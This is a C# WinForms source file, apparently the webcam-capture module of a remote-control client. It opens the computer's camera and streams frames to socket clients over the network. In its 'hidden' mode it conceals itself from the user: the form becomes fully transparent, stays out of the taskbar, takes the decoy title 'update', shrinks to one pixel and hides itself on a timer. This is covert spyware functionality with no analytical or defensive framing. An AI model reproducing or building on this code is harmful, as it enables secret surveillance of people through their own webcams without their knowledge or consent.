using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using AForge.Video.DirectShow;
using AForge.Video;
using System.Net.Sockets;
using System.Net;
using System.Threading;

namespace RemoteControl.Client.Excutor
{
    public partial class FrmCamCapture : Form
    {
        #region 私有字段

        private System.Collections.Concurrent.ConcurrentDictionary<string, Socket> _clients = new System.Collections.Concurrent.ConcurrentDictionary<string, Socket>();
        private Socket _broadcastServer = null;
        private string _broadcastServerIP = "127.0.0.1";
        private int _broadcastServerPort = 9001;
        private bool _isHide = true;
        private int _fps = 1;
        private int _intervalMilliSec = 1000;
        private string _captureErrorMessage = string.Empty;

        #endregion

        #region 构造函数

        /// <summary>
        /// 构造函数
        /// </summary>
        /// <param name="isHide">是否隐藏窗体</param>
        public FrmCamCapture(bool isHide, int fps)
        {
            InitializeComponent();
            _isHide = isHide;
            _fps = NormalizeFps(fps);
            _intervalMilliSec = 1000 / _fps;
            if (_isHide)
            {
                this.Opacity = 0;
                this.statusStrip1.Visible = false;
                this.ShowInTaskbar = false;
                this.timer2.Start();
                this.Text = "update";
                this.Width = 1;
                this.Height = 1;
                this.ControlBox = false;
            }
            else
            {
                this.Text = "摄像头采集";
            }
        } 

        #endregion

        #region 窗体载入

        /// <summary>
        /// 窗体载入
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void FrmMain_Load(object sender, EventArgs e)
        {
            StartCamCapture();
            new Thread(() => StartTransportServerInternal()) { IsBackground = true }.Start();
            new Thread(() => StartBroadcastInternal()) { IsBackground = true }.Start();
        } 

        #endregion

        #region 窗体关闭

        /// <summary>
        /// 窗体关闭
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(0);
        } 

        #endregion

        #region 摄像头操作

        private bool StartCamCapture()
        {
            try
            {
                var collection = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                if (collection.Count < 1)
                {
                    _captureErrorMessage = "未检测到可用摄像头";
                    Output(_captureErrorMessage);
                    return false;
                }

                var videoSource = new VideoCaptureDevice(collection[0].MonikerString);
                //videoSource.DesiredFrameRate = 1;
                //videoSource.NewFrame += new NewFrameEventHandler(videoSource_NewFrame);
                this.videoSourcePlayer1.VideoSource = videoSource;
                this.videoSourcePlayer1.Start();
                _captureErrorMessage = string.Empty;
                Output("已连接摄像头：" + collection[0].Name);

                return true;
            }
            catch (Exception ex)
            {
                _captureErrorMessage = "摄像头启动失败：" + ex.Message;
                Output(_captureErrorMessage);
                return false;
            }
        }

        private void videoSource_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            Broadcast(eventArgs.Frame);
        }

        private void StopCamCapture()
        {
            this.videoSourcePlayer1.Stop();
        }
 
        #endregion

        #region 状态输出函数

        /// <summary>
        /// 状态输出函数
        /// </summary>
        /// <param name="str"></param>
        private void Output(string str)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action<string>(Output), str);
                return;
            }
            this.toolStripStatusLabel3.Text = str;
        } 

        #endregion

        #region 隐藏窗体timer
        private void timer2_Tick(object sender, EventArgs e)
        {
            this.Hide();
            this.timer2.Enabled = false;
        } 
        #endregion
    }
}
